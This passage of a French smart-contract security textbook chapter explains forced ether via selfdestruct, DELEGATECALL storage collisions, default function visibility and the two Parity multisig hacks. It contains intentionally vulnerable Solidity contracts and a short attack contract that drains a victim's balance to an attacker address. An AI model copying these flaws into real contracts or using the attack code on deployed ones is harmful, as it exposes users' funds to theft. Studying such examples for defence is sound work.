<p>Tout contrat est capable d' implémenter la <a href="http://bit.ly/2RovrDf">fonction</a> <code>selfdestruct</code> , qui supprime tout le code intermédiaire de l&#8217;adresse du contrat et envoie tout l&#8217;ether qui y est stocké à l&#8217;adresse spécifiée par le paramètre. Si cette adresse spécifiée est également un contrat, aucune fonction (y compris la fonction de secours) n&#8217;est appelée. Par conséquent, la fonction <code>selfdestruct</code> peut être utilisée pour envoyer de force de l&#8217;ether à n&#8217;importe quel contrat, quel que soit le code pouvant exister dans le contrat, même les contrats sans fonctions payantes. Cela signifie que tout attaquant peut créer un contrat avec une fonction <code>selfdestruct</code> , lui envoyer de l&#8217;ether, appeler <code>selfdestruct(target)</code> et forcer l&#8217;ether à être envoyé à un contrat <code>target</code> . Martin Swende a un excellent <a href="http://bit.ly/2OfLukM">article de blog</a> décrivant certaines bizarreries de l&#8217;opcode d&#8217;autodestruction (Quirk # 2) ainsi qu&#8217;un compte rendu de la façon dont les nœuds clients vérifiaient des invariants incorrects, ce qui aurait pu conduire à un crash plutôt catastrophique du réseau Ethereum.</p>
</dd>
<dt class="hdlist1">Ether pré-envoyé</dt>
<dd>
<p>Une autre façon d&#8217;intégrer de l&#8217;ether dans un contrat consiste à précharger l&#8217;adresse du contrat avec de l&#8217;ether. Les adresses de contrat sont déterministes - en fait, l&#8217;adresse est calculée à partir du hachage Keccak-256 (généralement synonyme de SHA-3) de l&#8217;adresse créant le contrat et du nonce de transaction qui crée le contrat. Plus précisément, il se présente sous la forme <code>address = sha3(rlp.encode([ account_address,transaction_nonce ]))</code> (voir la discussion d&#8217;Adrian Manning sur <a href="http://bit.ly/2EPj5Tq">"Keyless Ether"</a> pour quelques cas d&#8217;utilisation amusants). Cela signifie que n&#8217;importe qui peut calculer quelle sera l&#8217;adresse d&#8217;un contrat avant sa création et envoyer de l&#8217;ether à cette adresse. Lorsque le contrat est créé, il aura un solde d&#8217;ether non nul.</p>
</dd>
</dl>
</div>
<div class="paragraph">
<p>Explorons quelques pièges qui peuvent survenir compte tenu de ces connaissances. Considérez le contrat trop simple dans <a href="#etherGame_security">EtherGame.sol</a>.</p>
</div>
<div id="etherGame_security" class="exampleblock">
<div class="title">Example 5. EtherGame.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;

    mapping(address =&gt; uint) redeemableEther;
    // Les utilisateurs paient 0,5 ether. À des étapes spécifiques, créditez leurs comptes.
    function play() external payable {
        require(msg.value == 0.5 ether); // chaque jeu est 0.5 ether
        uint currentBalance = this.balance + msg.value;
        // s'assure qu'il n'y a plus de joueurs après la fin du jeu
        require(currentBalance &lt;= finalMileStone);
        // si à un jalon, créditer le compte du joueur
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // s'assure que le jeu est terminé
        require(this.balance == finalMileStone);
        // s'assure qu'il y a une récompense à donner
        require(redeemableEther[msg.sender] &gt; 0);
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce contrat représente un jeu simple (qui impliquerait naturellement des conditions de course) où les joueurs envoient 0,5 ether au contrat dans l&#8217;espoir d&#8217;être le joueur qui atteint l&#8217;un des trois jalons en premier. Les jalons sont libellés en ether. Le premier à atteindre le jalon peut réclamer une partie de l&#8217;ether à la fin de la partie. Le jeu se termine lorsque le dernier jalon (10 ether) est atteint; les utilisateurs peuvent ensuite réclamer leurs récompenses.</p>
</div>
<div class="paragraph">
<p>Les problèmes avec le contrat <code>EtherGame</code> proviennent de la mauvaise utilisation de <code>this.balance</code> dans les deux lignes 14 (et par association 16) et 32. Un attaquant malicieux pourrait envoyer de force une petite quantité d&#8217;ether, disons 0,1 ether, via la fonction <code>selfdestruct</code> ( discuté plus tôt) pour empêcher tout futur joueur d&#8217;atteindre un jalon. <code>this.balance</code> ne sera jamais un multiple de 0,5 ether grâce à cette contribution de 0,1 ether, car tous les joueurs légitimes ne peuvent envoyer que des incréments de 0,5 ether. Cela empêche toutes les conditions if des lignes 18, 21 et 24 d&#8217;être vraies.</p>
</div>
<div class="paragraph">
<p>Pire encore, un attaquant vengeur qui a raté un jalon pourrait envoyer de force 10 ethers (ou une quantité équivalente d&#8217;ethers qui pousse le solde du contrat au-dessus du <code>finalMileStone</code> ), ce qui verrouillerait toutes les récompenses dans le contrat pour toujours. En effet, la fonction <code>claimReward</code> sera toujours rétablie, en raison de l&#8217;exigence à la ligne 32 (c&#8217;est-à-dire parce que <code>this.balance</code> est supérieur à <code>finalMileStone</code> ).</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_3">Techniques préventives</h4>
<div class="paragraph">
<p>Ce type de vulnérabilité provient généralement d&#8217;une mauvaise utilisation de <code>this.balance</code>. La logique contractuelle, dans la mesure du possible, doit éviter de dépendre des valeurs exactes du solde du contrat, car elle peut être artificiellement manipulée. Si vous appliquez une logique basée sur <code>this.balance</code> , vous devez faire face à des soldes inattendus.</p>
</div>
<div class="paragraph">
<p>Si des valeurs exactes d&#8217;ether déposé sont requises, une variable auto-définie doit être utilisée qui est incrémentée dans les fonctions payables, pour suivre en toute sécurité l&#8217;ether déposé. Cette variable ne sera pas influencée par l&#8217;ether forcé envoyé via un appel <code>selfdestruct</code>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;
    uint public depositedWei;

    mapping (address =&gt; uint) redeemableEther;

    function play() external payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // s'assure qu'il n'y a plus de joueurs après la fin du jeu
        require(currentBalance &lt;= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // s'assure que le jeu est terminé
        require(depositedWei == finalMileStone);
        // s'assure qu'il y a une récompense à donner
        require(redeemableEther[msg.sender] &gt; 0);
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }</code></pre>
</div>
</div>
<div class="paragraph">
<p>Ici, nous avons créé une nouvelle variable, <code>depositWei</code> , qui garde la trace de l&#8217;ether connu déposé, et c&#8217;est cette variable que nous utilisons pour nos tests. Notez que nous n&#8217;avons plus aucune référence à <code>this.balance</code>.</p>
</div>
</div>
<div class="sect3">
<h4 id="_autres_exemples">Autres exemples</h4>
<div class="paragraph">
<p>Quelques exemples de contrats exploitables ont été donnés dans le <a href="https://github.com/Arachnid/uscc/tree/master/submissions-2017/">Underhanded Solidity Coding Contest</a> , qui fournit également des exemples détaillés d&#8217;un certain nombre de pièges soulevés dans cette section.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_delegatecall_appel_délégué">DELEGATECALL (Appel délégué)</h3>
<div class="paragraph">
<p>Les opcodes <code>CALL</code> et <code>DELEGATECALL</code> sont utiles pour permettre aux développeurs Ethereum de modulariser leur code. Les appels de messages externes standard aux contrats sont gérés par l' opcode <code>CALL</code>, le code étant exécuté dans le contexte du contrat/de la fonction externe. L' opcode <code>DELEGATECALL</code> est presque identique, sauf que le code exécuté à l&#8217;adresse ciblée est exécuté dans le contexte du contrat appelant, et <code>msg.sender</code> et <code>msg.value</code> restent inchangés. Cette fonctionnalité permet la mise en œuvre de <em>bibliothèques</em> , permettant aux développeurs de déployer du code réutilisable une seule fois et de l&#8217;appeler à partir de futurs contrats.</p>
</div>
<div class="paragraph">
<p>Bien que les différences entre ces deux opcodes soient simples et intuitives, l&#8217;utilisation de <code>DELEGATECALL</code> peut conduire à l&#8217;exécution de code inattendu.</p>
</div>
<div class="paragraph">
<p>Pour plus de lecture, voir  <a href="http://bit.ly/2AAElb8">Question Ethereum Stack Exchange sur ce sujet</a> de Loi.Luu et la <a href="http://bit.ly/2Oi7UlH">documentation Solidity</a> .</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_4">La vulnérabilité</h4>
<div class="paragraph">
<p>En raison de la nature de préservation du contexte de <code>DELEGATECALL</code> , la création de bibliothèques personnalisées sans vulnérabilité n&#8217;est pas aussi simple qu&#8217;on pourrait le penser. Le code des bibliothèques elles-mêmes peut être sécurisé et sans vulnérabilité ; cependant, lorsqu&#8217;il est exécuté dans le contexte d&#8217;une autre application, de nouvelles vulnérabilités peuvent survenir. Voyons un exemple assez complexe de cela, en utilisant des nombres de Fibonacci.</p>
</div>
<div class="paragraph">
<p>Considérez la bibliothèque dans <a href="#fibonacci_security">FibonacciLib.sol</a>, qui peut générer la séquence de Fibonacci et des séquences de forme similaire. (Remarque : ce code a été modifié à partir de <a href="https://bit.ly/2MReuii">https://bit.ly/2MReuii</a> .)</p>
</div>
<div id="fibonacci_security" class="exampleblock">
<div class="title">Example 6. FibonacciLib.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">// contrat de bibliothèque - calcule les nombres de type Fibonacci
contract FibonacciLib {
    // initialisation de la suite standard de Fibonacci
    uint public start;
    uint public calculatedFibNumber;

    // modifie le numéro zéro de la séquence
    function setStart(uint _start) public {
        start = _start;
    }

    function setFibonacci(uint n) public {
        calculatedFibNumber = fibonacci(n);
    }

    function fibonacci(uint n) internal returns (uint) {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Cette bibliothèque fournit une fonction qui peut générer le <em>n</em>-ème nombre de Fibonacci dans la séquence. Il permet aux utilisateurs de changer le numéro de départ de la séquence (<code>start</code>) et de calculer les <em>n</em>-èmes nombres de type Fibonacci dans cette nouvelle séquence.</p>
</div>
<div class="paragraph">
<p>Considérons maintenant un contrat qui utilise cette bibliothèque, montré dans <a href="#fib_balance_security">FibonacciBalance.sol</a>.</p>
</div>
<div id="fib_balance_security" class="exampleblock">
<div class="title">Example 7. FibonacciBalance.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract FibonacciBalance {

    address public fibonacciLibrary;
    // le nombre de Fibonacci actuel à retirer
    uint public calculatedFibNumber;
    // le numéro de séquence de Fibonacci de départ
    uint public start = 3;
    uint public withdrawalCounter;
    // le sélecteur de fonction de Fibonancci
    bytes4 constant fibSig = bytes4(sha3("setFibonacci(uint256)"));

    // constructeur - charge le contrat avec ether
    constructor(address _fibonacciLibrary) external payable {
        fibonacciLibrary = _fibonacciLibrary;
    }

    function withdraw() {
        withdrawalCounter += 1;
        // calcule le nombre de Fibonacci pour l'utilisateur de retrait actuel-
        // ceci définit le nombreFibcalculé
        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));
        msg.sender.transfer(calculatedFibNumber * 1 ether);
    }

    // permet aux utilisateurs d'appeler les fonctions de la bibliothèque Fibonacci
    function() public {
        require(fibonacciLibrary.delegatecall(msg.data));
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce contrat permet à un participant de retirer des ethers du contrat, la quantité d&#8217;ethers étant égale au nombre de Fibonacci correspondant à l&#8217;ordre de retrait du participant ; c&#8217;est-à-dire que le premier participant obtient 1 ether, le second obtient également 1, le troisième obtient 2, le quatrième obtient 3, le cinquième 5, et ainsi de suite (jusqu&#8217;à ce que le solde du contrat soit inférieur au nombre de Fibonacci retiré).</p>
</div>
<div class="paragraph">
<p>Il y a un certain nombre d' éléments dans ce contrat qui peuvent nécessiter quelques explications. Tout d&#8217;abord, il existe une variable intéressante, <code>fibSig</code>. Cela contient les 4 premiers octets du hachage Keccak-256 (SHA-3) de la chaîne <code>'setFibonacci (uint256)'</code>. Ceci est connu sous le nom de <a href="http://bit.ly/2RmueMP">sélecteur de fonction</a> et est placé dans <code>calldata</code> pour spécifier quelle fonction d&#8217;un contrat intelligent sera appelée. Il est utilisé dans la fonction d&#8217;appel délégué à la ligne 21 pour spécifier que nous souhaitons exécuter la fonction <code>fibonacci(uint256)</code>. Le deuxième argument est <code>delegatecall</code> le paramètre que nous passons à la fonction. Deuxièmement, nous supposons que l&#8217;adresse de la bibliothèque <code>FibonacciLib</code> est correctement référencée dans le constructeur (<a href="#external_contract_referencing">Référencement des contrats externes</a> traite de certaines vulnérabilités potentielles liées à ce type d&#8217;initialisation de référence de contrat).</p>
</div>
<div class="paragraph">
<p>Pouvez-vous repérer des erreurs dans ce contrat ? Si l&#8217;on déployait ce contrat, le remplissait d&#8217;ether et appelait <code>withdraw</code>, il reviendrait probablement.</p>
</div>
<div class="paragraph">
<p>Vous avez peut-être remarqué que la variable d&#8217;état <code>start</code> est utilisée à la fois dans la bibliothèque et dans le contrat d&#8217;appel principal. Dans le contrat de bibliothèque, <code>start</code> est utilisé pour spécifier le début de la séquence de Fibonacci et est défini sur 0 , alors qu&#8217;il est défini sur <code>3</code> dans le contrat appelant. Vous avez peut-être également remarqué que la fonction de secours dans le contrat <code>FibonacciBalance</code> permet de transmettre tous les appels au contrat de bibliothèque, ce qui permet d&#8217;appeler la fonction <code>setStart</code> du contrat de bibliothèque. En rappelant que nous préservons l&#8217;état du contrat, il peut sembler que cette fonction permettrait de changer l&#8217;état de la variable <code>start</code> dans le contrat local <code>FibonnacciBalance</code>. Si c&#8217;est le cas, cela permettrait de retirer plus d&#8217;ether, car le <code>calculatedFibNumber</code> résultant dépend de la variable <code>start</code> (comme indiqué dans le contrat de bibliothèque). En réalité , la fonction <code>setStart</code> ne modifie pas (et ne peut pas modifier) la variable <code>start</code> dans le contrat <code>FibonacciBalance</code>. La vulnérabilité sous-jacente de ce contrat est bien pire que la simple modification de la variable <code>start</code>.</p>
</div>
<div class="paragraph">
<p>Avant de discuter du problème réel, faisons un petit détour pour comprendre comment les variables d&#8217;état sont réellement stockées dans les contrats. Les variables d&#8217;état ou de stockage (variables qui persistent sur des transactions individuelles) sont placées dans des <em>emplacements</em> de manière séquentielle au fur et à mesure qu&#8217;elles sont introduites dans le contrat. (Il y a quelques complexités ici ; consultez la documentation de <a href="http://bit.ly/2JslDWf">Solidity</a> pour une compréhension plus approfondie.)</p>
</div>
<div class="paragraph">
<p>Prenons l&#8217;exemple du contrat de bibliothèque. Il a deux variables d&#8217;état, <code>start</code> et <code>calculatedFibNumber</code> . La première variable, <code>start</code>, est stockée dans le stockage du contrat à <code>slot[0]</code> (c&#8217;est-à-dire le premier slot (fente ou espace)). La deuxième variable, <code>calculatedFibNumber</code>, est placée dans le prochain emplacement de stockage disponible, <code>slot[1]</code>. La fonction <code>setStart</code> prend une entrée et définit start quelle que soit l&#8217;entrée. Cette fonction définit donc <code>slot[0]</code> sur l&#8217;entrée que nous fournissons dans la fonction <code>setStart</code>. De la même manière, la fonction <code>setFibonacci</code> définit la fonction <code>calculatedFibNumber</code> sur le résultat de <code>fibonacci(n)</code>. Encore une fois, il s&#8217;agit simplement de définir storage <code>slot[1]</code> sur la valeur de <code>fibonacci(n)</code>.</p>
</div>
<div class="paragraph">
<p>Regardons maintenant le contrat <code>FibonacciBalance</code>. Storage <code>slot[0]</code> correspond maintenant à l' adresse <code>fibonacciLibrary</code> , et <code>slot[1]</code> correspond à <code>calculatedFibNumber</code> . C&#8217;est dans ce mappage incorrect que la vulnérabilité se produit. <code>delegatecall</code> <em>préserve le contexte du contrat</em> . Cela signifie que le code exécuté via l&#8217;appel délégué <code>delegatecall</code> agira sur l&#8217;état (c&#8217;est-à-dire le stockage) du contrat appelant.</p>
</div>
<div class="paragraph">
<p>Notez maintenant que <code>withdraw</code> à la ligne 21, nous exécutons <code>fibonacciLibrary.delegatecall(fibSig,withdrawalCounter)</code>. Cela appelle la fonction <code>setFibonacci</code>, qui, comme nous l&#8217;avons vu, modifie l&#8217;espace de stockage <code>slot[1]</code> , qui dans notre contexte actuel est <code>calculatedFibNumber</code> . C&#8217;est comme prévu (c&#8217;est-à-dire qu&#8217;après l&#8217;exécution, le <code>calculatedFibNumber</code> est modifié). Cependant, rappelez-vous que la variable de début dans le contrat <code>FibonacciLib</code> est située dans l&#8217;espace de stockage <code>slot[0]</code>, qui est l' adresse <code>fibonacciLibrary</code> dans le contrat actuel. Cela signifie que la fonction <code>fibonacci</code> donnera un résultat inattendu. En effet, il fait référence à <code>start</code> ( <code>slot[0]</code> ), qui dans le contexte d&#8217;appel actuel est l' adresse <code>fibonacciLibrary</code> (qui sera souvent assez grande, lorsqu&#8217;elle est interprétée comme un <code>uint</code>). Ainsi , il est probable que la fonction de retrait <code>withdraw</code> reviendra, car elle ne contiendra pas la quantité <code>uint(fibonacciLibrary)</code> d&#8217;ether, ce qui est ce que <code>calculatedFibNumber</code> renverra.</p>
</div>
<div class="paragraph">
<p>Pire encore, le contrat <code>FibonacciBalance</code> permet aux utilisateurs d&#8217;appeler toutes les fonctions <code>fibonacciLibrary</code> via la fonction de secours à la ligne 26. Comme nous l&#8217;avons vu précédemment, cela inclut la fonction <code>setStart</code>. Nous avons expliqué que cette fonction permet à quiconque de modifier ou de définir l' emplacement de stockage <code>slot[0]</code>. Dans ce cas, emplacement de stockage <code>slot[0]</code> est l' adresse <code>fibonacciLibrary</code>. Par conséquent, un attaquant pourrait créer un contrat malveillant, convertir l&#8217;adresse en <code>uint</code> (cela peut être fait facilement en Python en utilisant <code>int('&lt;address&gt;',16)</code> ), puis appeler <code>setStart</code> (<a href="#attack_contract_address_as_uint">[attack_contract_address_as_uint]</a>) . Cela changera <code>fibonacciLibrary</code> à l&#8217;adresse du contrat d&#8217;attaque. Ensuite, chaque fois qu&#8217;un utilisateur appelle <code>withdraw</code> ou la fonction de secours, le contrat malveillant s&#8217;exécutera (ce qui peut voler la totalité du solde du contrat) car nous avons modifié l&#8217;adresse réelle de <code>fibonacciLibrary</code>. Un exemple d&#8217;un tel contrat d&#8217;attaque serait :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract Attack {
    uint storageSlot0; // correspond à fibonacciLibrary
    uint storageSlot1; // correspond à calculatedFibNumber

    // défaut - cela s'exécutera si une fonction spécifiée n'est pas trouvée
    function() public {
        storageSlot1 = 0; // nous définissons calculateFibNumber sur 0, donc si retirer
        // s'appelle nous n'envoyons pas d'ether
        &lt;attacker_address&gt;.transfer(this.balance); // on prend tout l'ether
    }
 }</code></pre>
</div>
</div>
<div class="paragraph">
<p>Notez que ce contrat d&#8217;attaque modifie le <code>calculatedFibNumber</code> en changeant l&#8217;espace de stockage <code>slot[1]</code>. En principe, un attaquant pourrait modifier n&#8217;importe quel autre emplacement de stockage de son choix, pour effectuer toutes sortes d&#8217;attaques sur ce contrat. Nous vous encourageons à mettre ces contrats dans <a href="https://remix.ethereum.org">Remix</a> et à expérimenter différents contrats d&#8217;attaque et changements d&#8217;état via ces fonctions d&#8217;appel délégué <code>delegatecall</code>.</p>
</div>
<div class="paragraph">
<p>Il est également important de noter que lorsque nous disons que l&#8217;appel <code>delegatecall</code> préserve l&#8217;état, nous ne parlons pas des noms de variables du contrat, mais plutôt des emplacements de stockage réels vers lesquels ces noms pointent. Comme vous pouvez le voir dans cet exemple, une simple erreur peut conduire un attaquant à détourner l&#8217;intégralité du contrat et de son ether.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_4">Techniques préventives</h4>
<div class="paragraph">
<p>Solidity fournit le mot-clé de <code>library</code> (bibliothèque) pour la mise en œuvre des contrats de bibliothèque (voir la <a href="http://bit.ly/2zjD8TI">documentation</a> pour plus de détails). Cela garantit que le contrat de bibliothèque est sans état et non autodestructible. Forcer les bibliothèques à être sans état atténue les complexités du contexte de stockage démontrées dans cette section. Les bibliothèques sans état empêchent également les attaques dans lesquelles les attaquants modifient directement l&#8217;état de la bibliothèque afin d' affecter les contrats qui dépendent du code de la bibliothèque. En règle générale, lorsque vous utilisez <code>DELEGATECALL</code>, faites très attention au contexte d&#8217;appel possible du contrat de bibliothèque et du contrat d&#8217;appel, et chaque fois que possible, créez des <span class="keep-together">bibliothèques</span>. sans état.</p>
</div>
</div>
<div class="sect3">
<h4 id="multisig_secondhack">Exemple concret : Parity Multisig Wallet (Second Hack)</h4>
<div class="paragraph">
<p>Le deuxième hack de Parity Multisig Wallet est un exemple de la façon dont un code de bibliothèque bien écrit peut être exploité s&#8217;il est exécuté en dehors de son contexte prévu. Il existe un certain nombre de bonnes explications de ce hack, telles que <a href="http://bit.ly/2Dg7GtW">"Parity Multisig Hacked. Encore une fois »</a> et <a href="http://bit.ly/2Of06B9">« Un examen approfondi du bogue multisig de parity »</a>.</p>
</div>
<div class="paragraph">
<p>Pour compléter ces références, explorons les contrats qui ont été exploités. Les contrats de bibliothèque et de portefeuille peuvent être trouvés <a href="http://bit.ly/2OgnXQC">sur GitHub</a> .</p>
</div>
<div class="paragraph">
<p>Le contrat de bibliothèque est le suivant :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract WalletLibrary is WalletEvents {

  ...

  // lancer sauf si le contrat n'est pas encore initialisé.
  modifier only_uninitialized { if (m_numOwners &gt; 0) throw; _; }

  // constructeur - il suffit de transmettre le tableau propriétaire à multipropriété et
  // la limite à daylimit
  function initWallet(address[] _owners, uint _required, uint _daylimit)
      only_uninitialized {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }

  // tue le contrat en envoyant tout à `_to`.
  function kill(address _to) onlymanyowners(sha3(msg.data)) external {
    suicide(_to);
  }

  ...

}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Et voici le contrat de portefeuille :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract Wallet is WalletEvents {

  ...
  // MÉTHODES

  // est appelé lorsqu'aucune autre fonction ne correspond
  function() payable {
    // juste envoyer de l' argent ?
    if (msg.value &gt; 0)
      Deposit(msg.sender, msg.value);
    else if (msg.data.length &gt; 0)
      _walletLibrary.delegatecall(msg.data);
  }

  ...

  // DES CHAMPS
  address constant _walletLibrary =
    0xcafecafecafecafecafecafecafecafecafecafe;
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Notez que le contrat <code>Wallet</code> transmet essentiellement tous les appels au contrat <code>WalletLibrary</code> via un appel délégué. L&#8217;adresse constante <code>_walletLibrary</code> dans cet extrait de code agit comme un espace réservé pour le déploiement réel de contrat <code>WalletLibrary</code> (qui était à 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4 ).</p>
</div>
<div class="paragraph">
<p>L&#8217;opération voulue de ces contrats est d&#8217;avoir un portefeuille <code>Wallet</code> déployable à faible coût dont la base de code et les principales fonctionnalités se trouvaient dans le contrat <code>WalletLibrary</code>. Malheureusement, le contrat <code>WalletLibrary</code> est lui-même un contrat et conserve son propre état. Pouvez-vous voir pourquoi cela pourrait être un problème?</p>
</div>
<div class="paragraph">
<p>Il est possible d&#8217;envoyer des appels au contrat <code><span class="keep-together">WalletLibrary</span></code> lui-même. Plus précisément, le contrat <code><span class="keep-together">WalletLibrary</span></code> pourrait être initialisé et devenir propriétaire. En fait, un utilisateur a fait cela, appelant la fonction <code>initWallet</code> sur le contrat <code>WalletLibrary</code> et devenant propriétaire du contrat de bibliothèque. Le même utilisateur a ensuite appelé la fonction <code>kill</code> . Étant donné que l&#8217;utilisateur était propriétaire du contrat de bibliothèque, le modificateur a été adopté et le contrat de bibliothèque s&#8217;est auto-détruit. Comme tous les contrats <code>Wallet</code> existants se réfèrent à ce contrat de bibliothèque et ne contiennent aucune méthode pour modifier cette référence, toutes leurs fonctionnalités, y compris la possibilité de retirer de l&#8217;ether, ont été perdues avec le contrat <code>WalletLibrary</code> . En conséquence, tout l&#8217;ether de tous les portefeuilles multisig Parity de ce type a été instantanément perdu ou définitivement irrécupérable..</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_visibilités_par_défaut">Visibilités par défaut</h3>
<div class="paragraph">
<p>Les fonctions dans Solidity ont des spécificateurs de visibilité qui dictent comment elles peuvent être appelées. La visibilité détermine si une fonction peut être appelée en externe par les utilisateurs, par d&#8217;autres contrats dérivés, uniquement en interne ou uniquement en externe. Il existe quatre spécificateurs de visibilité, qui sont décrits en détail dans la <a href="http://bit.ly/2ABiv7j">documentation Solidity</a>. Les fonctions sont par défaut à <code>public</code> , permettant aux utilisateurs de les appeler de l&#8217;extérieur. Nous allons maintenant voir comment une utilisation incorrecte des spécificateurs de visibilité peut entraîner des vulnérabilités dévastatrices dans les contrats intelligents.</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_5">La vulnérabilité</h4>
<div class="paragraph">
<p>La visibilité par défaut des fonctions est <code>public</code> , donc les fonctions qui ne spécifient pas leur visibilité pourront être appelées par des utilisateurs externes. Le problème survient lorsque les développeurs omettent par erreur les spécificateurs de visibilité sur les fonctions qui devraient être privées (ou uniquement appelables dans le contrat lui-même).</p>
</div>
<div class="paragraph">
<p>Explorons rapidement un exemple trivial :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract HashForEther {

    function withdrawWinnings() {
        // Gagnant si les 8 derniers caractères hexadécimaux de l'adresse sont 0
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }

     function _sendWinnings() {
         msg.sender.transfer(this.balance);
     }
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Ce contrat simple est conçu pour agir comme un jeu de prime de devinette d&#8217;adresse. Pour remporter le solde du contrat, un utilisateur doit générer une adresse Ethereum dont les 8 derniers caractères hexadécimaux sont 0. Une fois atteint, il peut appeler la fonction <code>withdrawWinnings</code> pour obtenir sa prime.</p>
</div>
<div class="paragraph">
<p>Malheureusement, la visibilité des fonctions n&#8217;a pas été précisée. En particulier, la fonction <code>_sendWinnings</code> est <code>public</code> (par défaut), et donc n&#8217;importe quelle adresse peut appeler cette fonction pour voler la prime.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_5">Techniques préventives</h4>
<div class="paragraph">
<p>Il est de bonne pratique de toujours spécifier la visibilité de toutes les fonctions dans un contrat, même si elles sont intentionnellement <code>public</code>. Les versions récentes de solc affichent un avertissement pour les fonctions qui n&#8217;ont pas de visibilité explicite définie, pour encourager cette pratique.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemple_concret_parity_multisig_wallet_premier_hack">Exemple concret : Parity Multisig Wallet (premier hack)</h4>
<div class="paragraph">
<p> Dans le premier multisig hack de Parity, environ 31 millions de dollars d&#8217;ether ont été volés, principalement dans trois portefeuilles. Un bon récapitulatif de la façon exacte dont cela a été fait est donné par <a href="https://bit.ly/2vHiuJQ">Haseeb Qureshi</a>.</p>
</div>
<div class="paragraph">
<p>Essentiellement, le portefeuille multisig est construit à partir d&#8217;un contrat <code>Wallet</code> de base, qui appelle un contrat de bibliothèque contenant la fonctionnalité de base (comme décrit dans <a href="#multisig_secondhack">Exemple concret : Parity Multisig Wallet (Second Hack)</a>). Le contrat de bibliothèque contient le code pour initialiser le portefeuille, comme le montre l&#8217;extrait suivant :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract WalletLibrary is WalletEvents {

  ...

  // MÉTHODES

  ...

  // le constructeur reçoit le nombre de sigs requis pour faire des
  // transactions protégés "seulement pour ces propriétaires" ainsi que
  //  la sélection des adresses capable de les confirmer
  function initMultiowned(address[] _owners, uint _required) {
    m_numOwners = _owners.length + 1;
    m_owners[1] = uint(msg.sender);
    m_ownerIndex[uint(msg.sender)] = 1;
    for (uint i = 0; i &lt; _owners.length; ++i)
    {
      m_owners[2 + i] = uint(_owners[i]);
      m_ownerIndex[uint(_owners[i])] = 2 + i;
    }
    m_required = _required;
  }

  ...

  // constructeur - il suffit de transmettre le tableau propriétaire à multipropriété et
  // la limite à daylimit
  function initWallet(address[] _owners, uint _required, uint _daylimit) {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }
}</code></pre>
</div>
</div>
<div class="paragraph">
<p>Notez qu&#8217;aucune des fonctions ne spécifie leur visibilité, donc les deux sont par défaut <code>public</code> . La fonction <code>initWallet</code> est appelée dans le constructeur du portefeuille et définit les propriétaires du portefeuille multisig comme on peut le voir dans la fonction <code>initMultiowned</code> . Étant donné que ces fonctions ont été accidentellement laissées publiques , un attaquant a pu appeler ces fonctions sur des contrats déployés, réinitialisant la propriété à l&#8217;adresse de l&#8217;attaquant. En tant que propriétaire, l&#8217;attaquant a ensuite vidé les portefeuilles de tout leur ether.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="entropyillusion_security">Illusion d&#8217;entropie</h3>
<div class="paragraph">
